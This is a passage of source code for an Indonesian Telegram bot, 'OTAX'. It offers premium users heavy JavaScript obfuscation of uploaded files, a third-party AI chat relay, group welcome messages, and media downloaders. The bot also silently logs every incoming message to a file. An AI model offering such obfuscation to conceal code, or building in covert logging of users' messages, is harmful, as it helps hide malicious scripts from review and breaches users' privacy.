`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

   
    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "🙈 *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith(".js")) {
        return bot.sendMessage(chatId, "🙈 *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
    }

    const encryptedPath = path.join(__dirname, `OTAX-encrypted-${file.file_name}`);

    try {
        const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");

        await updateProgress(bot, chatId, progressMessage, 10, "Mengunduh File");

        // **Perbaikan pengambilan file dari Telegram**
        const fileData = await bot.getFile(file.file_id);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.file_path}`;
        const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
        let fileContent = response.data.toString("utf-8");

        await updateProgress(bot, chatId, progressMessage, 20, "Mengunduh Selesai");

        
        try {
            new Function(fileContent);
        } catch (syntaxError) {
            throw new Error(`Kode awal tidak valid: ${syntaxError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");

        
        const obfuscated = await JsConfuser.obfuscate(fileContent, getAphocalypsObfuscationConfig());
        let obfuscatedCode = obfuscated.code || obfuscated;

        if (typeof obfuscatedCode !== "string") {
            throw new Error("Hasil obfuscation bukan string");
        }

       
        try {
            new Function(obfuscatedCode);
        } catch (postObfuscationError) {
            throw new Error(`Hasil obfuscation tidak valid: ${postObfuscationError.message}`);
        }

        await updateProgress(bot, chatId, progressMessage, 80, "Finalisasi Enkripsi");

        await fs.promises.writeFile(encryptedPath, obfuscatedCode);

        
        await bot.sendDocument(chatId, encryptedPath, {
            caption: "🔥 *File terenkripsi (OtaXxx Chaos Core) siap!*\n_©OtaXxx ENC_",
            parse_mode: "Markdown"
        });

        await updateProgress(bot, chatId, progressMessage, 100, "OtaXxx Chaos Core Selesai");

        
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    } catch (error) {
        await bot.sendMessage(chatId, `🙈 *Kesalahan:* ${error.message || "Tidak diketahui"}\n_Coba lagi dengan kode Javascript yang valid!_`, { parse_mode: "Markdown" });

       
        try {
            await fs.promises.access(encryptedPath);
            await fs.promises.unlink(encryptedPath);
        } catch (err) {
            console.error("Gagal menghapus file:", err.message);
        }
    }
});
;
const historyDir = './chat_history';
async function ensureHistoryDir() {
    try {
        await fs.mkdir(historyDir, { recursive: true }); 
    } catch (error) {
        console.error("Error membuat direktori riwayat:", error);
    }
}


(async () => { 
    await ensureHistoryDir(); 
})();


const chatHistory = {}; 
async function saveHistoryToFile(chatId, history) {
  const filename = `${historyDir}/${chatId}.json`; 
    try {
        await fs.writeFile(filename, JSON.stringify(history, null, 2)); 
        
    } catch (error) {
        console.error("Error menyimpan riwayat ke file:", error);
    }
}


async function loadHistoryFromFile(chatId) {
    const filename = `${historyDir}/${chatId}.json`;
    try {
        const data = await fs.readFile(filename, 'utf8');
        return JSON.parse(data);
    } catch (error) {
        
        if (error.code === 'ENOENT') {
            
            return [];
        }
        console.error("Error memuat riwayat dari file:", error);
        return []; 
    }
}

async function generateAIResponse(text) {
    try {
        const hai = text;
        const response = await axios.get(`https://api.agatz.xyz/api/gptlogic?logic=Generate%20humanized%20chatgpt%20text%20in%20Indonesian,%20you%20are%20an%20AI%20assistant%20named%20GPT&p=${encodeURIComponent(text)}`);
        const data = response.data;
      

        if (data && data.data && "result" in data.data) {
            return `${data.data.result}`;
        } else {
            console.error("Error: No 'result' key found in the response:", data);
            return "❌ Tidak ada hasil dari API."; 
        }
    } catch (error) {
        console.error("Error fetching or processing AI response:", error);
        if (error.response) {
                console.error("Response data:", error.response.data);
                console.error("Response status:", error.response.status);
                console.error("Response headers:", error.response.headers);
                return  `❌ Terjadi kesalahan pada saat menghubungi API. Status: ${error.response.status}`;
            } else if (error.request) {
                console.error("No response received:", error.request);
                return "❌ Tidak ada respon dari server.";
            } else {
                console.error("Error during request setup:", error.message);
                return `❌ Terjadi kesalahan: ${error.message}`;
            }
    }
}


bot.onText(/\/on/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id; 
    if (shouldIgnoreMessage(msg)) return;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }
    aiEnabled = true;
    bot.sendMessage(chatId, '🤖OTAX diaktifkan.', { parse_mode: 'Markdown' });
});

bot.onText(/\/off/, (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id
    if (shouldIgnoreMessage(msg)) return;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "𝘿𝙖𝙣 𝙔𝙖𝙥!? 𝙀𝙣𝙩𝙚 𝙎𝙞𝙖𝙥𝙖? 𝙔𝙖𝙣𝙜 𝘽𝙞𝙨𝙖 𝙈𝙖𝙠𝙚 𝘾𝙪𝙢𝙖𝙣 𝙊𝙬𝙣𝙚𝙧 𝙂𝙬!!✘𓂸",
            { parse_mode: "Markdown" }
        );
    }
    
    aiEnabled = false;
    bot.sendMessage(chatId, '🤖OTAX dinonaktifkan.', { parse_mode: 'Markdown' });
});


async function logMessageToFile(msg) {
  try {
    const logFilePath = 'pesan_masuk.log'; 
    const timestamp = new Date().toISOString();
    const logEntry = `${timestamp} - ${JSON.stringify(msg)}\n`; 
    await fs.appendFile(logFilePath, logEntry); 
  } catch (error) {
    console.error('Error menulis ke file log:', error);
  }
}

let aiEnabled = false; 


bot.on('message', async (msg) => {
    logMessageToFile(msg);

    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text) return; 
    if (!aiEnabled) return; 

    
    const chatType = msg.chat.type;

    
    if (chatType === 'private' || chatType === 'group' || chatType === 'supergroup') {

        try {
            bot.sendChatAction(chatId, 'typing');
            const responseText = await generateAIResponse(text); 

            
            bot.sendMessage(chatId, responseText, {
                parse_mode: 'HTML',
                reply_to_message_id: msg.message_id  
            });


        } catch (error) {
            console.error("Error in AI response:", error);
            
            bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`, {
                parse_mode: 'HTML',
                reply_to_message_id: msg.message_id
            });
        }
    }
});
const welcomeMessages = {};
const goodbyeMessages = {};
let welcomeEnabled = true;
let goodbyeEnabled = true;

const adminList = {}; 

async function sendGoodbyeMessage(chatId, member) {
          
          if (!goodbyeEnabled) {
              
              return;  
          }
          
          const customGoodbyeMessage = goodbyeMessages[chatId] || 'Sampai jumpa!'; 
          const username = member.username ? `@${member.username}` : member.first_name;
          const goodbyeText = customGoodbyeMessage.replace('{username}', username);
          try {
                await bot.sendMessage(chatId, goodbyeText, { parse_mode: 'Markdown' });
                
            } catch (error) {
                console.error('Error mengirim pesan perpisahan:', error);
            }
        }
bot.onText(/^\/setwelcome (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
       return bot.sendMessage(chatId, "⚠️  Maaf, Anda harus menjadi owner atau admin untuk mengubah pesan selamat datang.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id }); // Membalas
    }
  
    const newWelcomeMessage = match[1];  
    if (!newWelcomeMessage) {
          return bot.sendMessage(chatId, "⚠️  Silakan berikan pesan selamat datang setelah perintah /setwelcome.",  { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); 
    }
   
    welcomeMessages[chatId] = newWelcomeMessage;
    bot.sendMessage(chatId, "✅ Pesan selamat datang berhasil diatur.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); 
});

bot.onText(/^\/setgoodbye (.+)$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
       return bot.sendMessage(chatId, "⚠️  Maaf, Anda harus menjadi owner atau admin untuk mengubah pesan perpisahan.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id }); 
    }
    const newGoodbyeMessage = match[1];  
    if (!newGoodbyeMessage) {
          return bot.sendMessage(chatId, "⚠️  Silakan berikan pesan perpisahan setelah perintah /setgoodbye.",  { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); // Membalas
    }
    
    goodbyeMessages[chatId] = newGoodbyeMessage;
    bot.sendMessage(chatId, "✅ Pesan perpisahan berhasil diatur.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }); 
});


bot.onText(/^\/welcomeon$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
         return bot.sendMessage(chatId, "⚠️  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    welcomeEnabled = true;
    bot.sendMessage(chatId, "✅ Fitur selamat datang diaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});


bot.onText(/^\/welcomeoff$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
        return bot.sendMessage(chatId, "⚠️  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    welcomeEnabled = false;
    bot.sendMessage(chatId, "✅ Fitur selamat datang dinonaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.onText(/^\/goodbyeon$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
        return bot.sendMessage(chatId, "⚠️  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    goodbyeEnabled = true;
    bot.sendMessage(chatId, "✅ Fitur perpisahan diaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.onText(/^\/goodbyeoff$/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
if (shouldIgnoreMessage(msg)) return;
    if (!isOwner(userId) && !(await isAdmin(chatId, userId))) {
         return bot.sendMessage(chatId, "⚠️  Maaf, Anda bukan owner atau admin grup.", { parse_mode: "Markdown", reply_to_message_id: msg.message_id });
    }
    goodbyeEnabled = false;
    bot.sendMessage(chatId, "✅ Fitur perpisahan dinonaktifkan.", { parse_mode: 'Markdown', reply_to_message_id: msg.message_id });
});

bot.on('new_chat_members', async (msg) => {
    const chatId = msg.chat.id;
    if (!welcomeEnabled) return; 

    const newMembers = msg.new_chat_members;
    if (!newMembers || newMembers.length === 0) return;

    
    const customWelcomeMessage = welcomeMessages[chatId] || "Selamat datang di grup!"; 
    newMembers.forEach(async (member) => {
        const userId = member.id;
        const username = member.username ? `@${member.username}` : member.first_name;
        const welcomeText = customWelcomeMessage.replace('{username}', username); 

        try {
            bot.sendMessage(chatId, welcomeText, { parse_mode: "Markdown" }); 
        } catch (error) {
            console.error("Error mengirim pesan selamat datang:", error);
        }
    });
});

bot.on('left_chat_member', async (msg) => {
    
    const chatId = msg.chat.id;
    if (!goodbyeEnabled) {
        return;  
    }
    const member = msg.left_chat_member;
    if (!member) {  
       console.warn("Peringatan:  Tidak ada informasi anggota yang keluar."); 
        return;
    }
    await sendGoodbyeMessage(chatId, member);
});
let botStartTime = new Date();
function getRuntime() {
  const now = new Date();
  const diffInSeconds = Math.floor((now - botStartTime) / 1000);
  const days = Math.floor(diffInSeconds / (3600 * 24));
  const hours = Math.floor((diffInSeconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((diffInSeconds % 3600) / 60);
  const seconds = diffInSeconds % 60;
  return `${days} hari, ${hours} jam, ${minutes} menit, ${seconds} detik`;
}


function getWIBTime() {
    const now = new Date();

    
    const wibTime = now.toLocaleString('id-ID', {
        timeZone: 'Asia/Jakarta', 
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false 
    });
    return wibTime;
}

bot.onText(/\/status/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const welcomeMessage = welcomeMessages[chatId] || "Belum diatur";
    const goodbyeMessage = goodbyeMessages[chatId] || "Belum diatur"; // (BARU)
    const aiStatusText = aiEnabled ? "✅ Aktif" : "❌ Tidak Aktif";
    const welcomeStatus = welcomeEnabled ? "✅ Aktif" : "❌ Tidak Aktif";
    const goodbyeStatus = goodbyeEnabled ? "✅ Aktif" : "❌ Tidak Aktif"; // (BARU)
if (shouldIgnoreMessage(msg)) return;
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}

    const statusText = `
╭━━「 ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ 」━━━⬣
     🌀 sᴛᴀᴛᴜs ᴏᴛᴀx :
🌀 ᴀɪ: ${aiStatusText}
🌀 ғɪᴛᴜʀ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ: ${welcomeStatus}
🌀 ғɪᴛᴜʀ ɢᴏᴏᴅʙʏᴇ: ${goodbyeStatus} 
🌀 ᴘᴇsᴀɴ sᴇʟᴀᴍᴀᴛ ᴅᴀᴛᴀɴɢ : ${welcomeMessage.substring(0, 20)}...
🌀 ᴘᴇsᴀɴ ɢᴏᴏᴅʙʏᴇ : ${goodbyeMessage.substring(0, 20)}...
🌀 ᴡᴀᴋᴛᴜ ᴍᴜʟᴀɪ (ᴡɪʙ): ${botStartTime ? botStartTime.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }) : 'Tidak Diketahui'} (WIB) 
🌀 ᴡᴀᴋᴛᴜ sᴇᴋᴀʀᴀɴɢ (ᴡɪʙ): ${getWIBTime()}
🌀 ᴡᴀᴋᴛᴜ ᴀᴋᴛɪғ: ${getRuntime()}
╰────────────────⬣
𝘾𝙧𝙚𝙖𝙩𝙚𝙙 𝘽𝙮 𝙊𝙏𝘼𝙓 ×͜×
  `;
    bot.sendMessage(chatId, statusText, { parse_mode: "Markdown" });
});
// scrape command by otax
async function fetchJson(url, options) {
    try {
        options ? options : {}
        const res = await axios({
            method: 'GET',
            url: url,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36'
            },
            ...options
        })
        return res.data
    } catch (err) {
        return err
    }
}
bot.onText(/^(\/tt)\s+(.*)/i, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const text = match[2]; 
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (!text) {
            return bot.sendMessage(chatId, 'Mohon berikan URL tiktok!', { reply_to_message_id: msg.message_id });
        }
        if (!text.includes('tiktok.com')) {
            return bot.sendMessage(chatId, 'Harus berupa link tiktok!', { reply_to_message_id: msg.message_id });
        }
       
        
        try {
            const jir = await fetchJson(`https://vapis.my.id/api/ttdl?url=${text}`);

            if (jir.status && jir.data) {
                const nowmVideo = jir.data.data.find(item => item.type === 'nowatermark');
                if (nowmVideo) {
                    
                    const videoUrl = nowmVideo.url;
                    const videoResponse = await axios({
                        method: 'GET',
                        url: videoUrl,
                        responseType: 'stream', 
                    });

                    
                    const filename = `/tmp/tiktok_${Date.now()}.mp4`; 
                    const writer = fs.createWriteStream(filename);
                    videoResponse.data.pipe(writer);

                    await new Promise((resolve, reject) => {
                        writer.on('finish', resolve);
                        writer.on('error', reject);
                    });

                    
                    try {
                        await bot.sendVideo(chatId, fs.createReadStream(filename), {
                            caption: `© ᴏᴛᴀx ғᴏʀ ʏᴏᴜ`,
                            reply_to_message_id: msg.message_id,
                        });
                        console.log(`Berhasil mengirim video TikTok ke ${chatId}`);
                    } catch (sendError) {
                        console.error('Kesalahan saat mengirim video:', sendError);
                        return bot.sendMessage(chatId, 'Gagal mengirim video. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
                    } finally {
                        
                        try {
                            fs.unlinkSync(filename);
                            console.log(`Berkas video TikTok dihapus: ${filename}`);
                        } catch (unlinkError) {
                            console.error('Kesalahan saat menghapus berkas video:', unlinkError);
                        }
                    }
                }
            }
        } catch (err1) {
            console.error('Kesalahan dari API vapis.my.id:', err1); 
           
            try {
                const anu = await fetchJson(`https://api.vreden.web.id/api/tiktok?url=${text}`);

                if (anu && anu.result && anu.result.data) {
                    const data = anu.result.data;
                    if (data.length === 0) {
                        return bot.sendMessage(chatId, 'Tidak ada video/foto yang ditemukan.', { reply_to_message_id: msg.message_id });
                    }

                    const imgs = data[0]; 
                    if (imgs.type === 'nowatermark') {
                        
                        const videoUrl = imgs.url;
                        const videoResponse = await axios({
                            method: 'GET',
                            url: videoUrl,
                            responseType: 'stream', 
                        });

                        
                        const filename = `/tmp/tiktok_${Date.now()}.mp4`; 
                        const writer = fs.createWriteStream(filename);
                        videoResponse.data.pipe(writer);

                        await new Promise((resolve, reject) => {
                            writer.on('finish', resolve);
                            writer.on('error', reject);
                        });

                        
                        try {
                            await bot.sendVideo(chatId, fs.createReadStream(filename), {
                                caption: `ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`,
                                reply_to_message_id: msg.message_id,
                            });
                            console.log(`Berhasil mengirim video TikTok ke ${chatId}`);
                        } catch (sendError) {
                            console.error('Kesalahan saat mengirim video:', sendError);
                            return bot.sendMessage(chatId, 'Gagal mengirim video. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
                        } finally {
                           
                            try {
                                fs.unlinkSync(filename);
                                console.log(`Berkas video TikTok dihapus: ${filename}`);
                            } catch (unlinkError) {
                                console.error('Kesalahan saat menghapus berkas video:', unlinkError);
                            }
                        }
                    } else if (imgs.type === 'photo') {
                         return bot.sendPhoto(chatId, imgs.url, {
                            caption: `© ᴏᴛᴀx ғᴏʀ ʏᴏᴜ\n\n${m.isGroup ? 'Sisa foto dikirim di private chat' : ''}`,
                            reply_to_message_id: msg.message_id
                        });
                    }
                }
            } catch (err2) {
                console.error('Kesalahan dari API api.vreden.web.id:', err2); 
                return bot.sendMessage(chatId, 'Gagal mengunduh video. Coba lagi nanti atau periksa URL.', { reply_to_message_id: msg.message_id });
            }
        }

    } catch (err) {
        console.error('Terjadi kesalahan secara keseluruhan: ', err); 
        return bot.sendMessage(chatId, 'Terjadi kesalahan secara keseluruhan saat memproses permintaan.', { reply_to_message_id: msg.message_id }); 
    }
});
bot.onText(/^(\/mediafire)\s+(.*)/i, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const text = match[2]; // Dapatkan URL MediaFire dari grup penangkapan kedua
    if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (!text) {
            return bot.sendMessage(chatId, 'Mohon berikan link mediafire!', { reply_to_message_id: msg.message_id });
        }
        if (!text.includes('mediafire.com')) {
            return bot.sendMessage(chatId, 'Harus berupa link mediafire!', { reply_to_message_id: msg.message_id });
        }

        
        try {
            const api = await fetchJson(`https://api.vreden.web.id/api/mediafiredl?url=${text}`);
       
            if (!api || !api.result || !api.result[0]) {
                return bot.sendMessage(chatId, 'Gagal mendapatkan informasi berkas dari MediaFire.', { reply_to_message_id: msg.message_id });
            }

            const data = api.result[0];

            const fileNama = decodeURIComponent(data.nama || 'file.zip');
            const extension = fileNama.split('.').pop().toLowerCase();
            let tempFilePath = ''; 

            try {
                const res = await axios.get(data.link, {
                    responseType: 'arraybuffer',
                });
                const media = Buffer.from(res.data);
                // Simpan file ke temporary file
                tempFilePath = `/tmp/${Date.now()}.${extension}`;
                fs.writeFileSync(tempFilePath, media);

                let mimetype = '';
                if (extension === 'mp4') {
                    mimetype = 'video/mp4';
                } else if (extension === 'mp3') {
                    mimetype = 'audio/mp3';
                } else {
                    mimetype = `application/${extension}`;
                }

                await bot.sendDocument(chatId, fs.createReadStream(tempFilePath), { 
                    filename: fileNama,
                    mimetype: mimetype,
                    reply_to_message_id: msg.message_id,
                });
            } catch (axiosError) {
                console.error('Kesalahan saat mengunduh atau mengirim berkas:', axiosError);
                return bot.sendMessage(chatId, 'Gagal mengunduh atau mengirim berkas. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
            } finally { 
                if (tempFilePath) {
                  try {
                    fs.unlinkSync(tempFilePath);
                    console.log(`Berhasil menghapus berkas temporary: ${tempFilePath}`);
                  } catch (unlinkError) {
                    console.error('Kesalahan saat menghapus berkas temporary:', unlinkError);
                  }
                }
            }
        } catch (apiError) {
            console.error('Kesalahan saat memanggil API:', apiError);
            return bot.sendMessage(chatId, 'Gagal mendapatkan informasi berkas. Coba lagi nanti.', { reply_to_message_id: msg.message_id });
        }

    } catch (err) {
        console.error('Terjadi kesalahan secara keseluruhan: ', err);
        return bot.sendMessage(chatId, 'Terjadi kesalahan secara keseluruhan saat memproses permintaan.', { reply_to_message_id: msg.message_id });
    }
});
const ytdl = require("@lyrra-evanth/src-yt"); 
const { ytdlv2 } = require('@leoo-vanth/zarv-vz');
bot.onText(/^(\/play)\s+(.*)/i, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const text = match[2]; 
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}  if (!text) {
            return bot.sendMessage(chatId, '*Masukkan Judul Lagu!*\n\nContoh:\n/play My Little Dark Age', { reply_to_message_id: msg.message_id, parse_mode: 'Markdown' });
        }

        const search = await ytdl.search(text);
        const data = search.results.filter(objek => objek.type === "video");
        const convert = data[0];

        if (!convert) {
            return bot.sendMessage(chatId, 'Audio tidak ditemukan!', { reply_to_message_id: msg.message_id });
        }
        
        await bot.sendChatAction(chatId, 'typing');

        const response = await ytdlv2(convert.url, 'mp3', 128); 
        const downloadPath = response.download;

        if (!fs.existsSync(downloadPath)) {
            return bot.sendMessage(chatId, 'Gagal mengunduh audio!', { reply_to_message_id: msg.message_id });
        }    
       
        try {
            const resThumb = await axios.get(convert.thumbnail, { responseType: 'arraybuffer' });
            const thumbs = Buffer.from(resThumb.data);

            
            await bot.sendAudio(chatId, fs.createReadStream(downloadPath), {
                title: convert.title,
                performer: convert.author.name,
                reply_to_message_id: msg.message_id,
                
                caption: `✅ Berhasil mengunduh:\nJudul: ${convert.title}\nArtis: ${convert.author.name}\n
                ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`,
            });
          
        } catch (thumbError) {
            console.error('Gagal mendapatkan thumbnail:', thumbError);
            
            await bot.sendAudio(chatId, fs.createReadStream(downloadPath), {
                title: convert.title,
                performer: convert.author.name,
                reply_to_message_id: msg.message_id,
                caption: `✅ Berhasil mengunduh:\nJudul: ${convert.title}\nArtis: ${convert.author.name}\n(Tidak dapat mengambil thumbnail)\n
                ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`,
            });
            
        }
        try {
            fs.unlinkSync(downloadPath);
        } catch (unlinkError) {
            bot.sendMessage('Gagal menghapus berkas audio:', unlinkError);
        }

    } catch (err) {
        return bot.sendMessage(chatId, 'Terjadi kesalahan: ' + err.message, { reply_to_message_id: msg.message_id });
    }
});

async function CatBox(path) {
    const data = new FormData();
    data.append('reqtype', 'fileupload');
    data.append('userhash', '');
    data.append('fileToUpload', fs.createReadStream(path));

    
    const config = {
        method: 'POST',
        url: 'https://catbox.moe/user/api.php',
        headers: data.getHeaders(), 
        data: data
    };
    const api = await axios.request(config);
    return api.data;
}


function getFileExtension(contentType) {
    if (!contentType) {
        return '.bin'; 
    }
    if (contentType.includes('image/jpeg') || contentType.includes('image/jpg')) {
        return '.jpg';
    } else if (contentType.includes('image/png')) {
        return '.png';
    } else if (contentType.includes('image/gif')) {
        return '.gif';
    } else if (contentType.includes('video/mp4')) {
        return '.mp4';
    } else if (contentType.includes('video/quicktime')) {
        return '.mov'; 
    } else if (contentType.includes('audio/mpeg')) {
        return '.mp3';
    } else if (contentType.includes('audio/ogg')) {
        return '.ogg';
    } else if (contentType.includes('application/pdf')) {
        return '.pdf';
    } else if (contentType.includes('application/zip')) {
        return '.zip';
    } else {
        return '.bin'; 
    }
}


// Handler perintah /tourl
bot.onText(/\/tourl/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const senderId = msg.from.id;
    const randomImage = getRandomImage(); 
    const message = msg;
if (shouldIgnoreMessage(msg)) return;
    try {
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`𝙀𝙩𝙙𝙖𝙝\`\`\`
𝙀𝙢𝙖𝙣𝙜𝙣𝙮𝙖 𝙇𝙪 𝙎𝙞𝙖𝙥𝙖ूाीू ?
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/Otapengenkawin" }]
      ]
    }
  });
}
        if (message.reply_to_message) {
            const repliedMessage = message.reply_to_message;
            let fileId;
            let contentType; 

            if (repliedMessage.photo) {
                fileId = repliedMessage.photo[repliedMessage.photo.length - 1].file_id;
                contentType = 'image/jpeg';  
            } else if (repliedMessage.video) {
                fileId = repliedMessage.video.file_id;
                contentType = 'video/mp4'; 
            } else if (repliedMessage.document) {
                fileId = repliedMessage.document.file_id;
                contentType = repliedMessage.document.mime_type; 
            } else if (repliedMessage.audio) {
                fileId = repliedMessage.audio.file_id;
                contentType = repliedMessage.audio.mime_type; 
            } else {
                return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
            }

            
            const fileInfo = await bot.getFile(fileId);
            const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
            const response = await axios.get(fileLink, { responseType: 'stream' });

            
            const fileExtension = getFileExtension(contentType);
            
            const filePath = `./temp_${Date.now()}${fileExtension}`;

            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);

            await new Promise((resolve, reject) => {
                writer.on('finish', resolve);
                writer.on('error', reject);
            });

            
            const catBoxUrl = await CatBox(filePath);
            const result = `📦 *CatBox*: ${catBoxUrl || '-'}\n
            ᴄʀᴇᴀᴛᴇ ʙʏ ᴏᴛᴀx⸙`;
            bot.sendMessage(chatId, result, { parse_mode: 'Markdown', reply_to_message_id: repliedMessage.message_id });

            
            fs.unlinkSync(filePath);

        } else {
            return bot.sendMessage(chatId, 'Silakan reply pesan yang berisi foto, video, dokumen, atau audio dengan perintah /tourl.');
        }

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, 'Terjadi kesalahan saat memproses file.');
    }
});
bot.onText(/\/owner (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const message = match[1]; 
    const userId = msg.from.id;
    const senderId = msg.from.id;
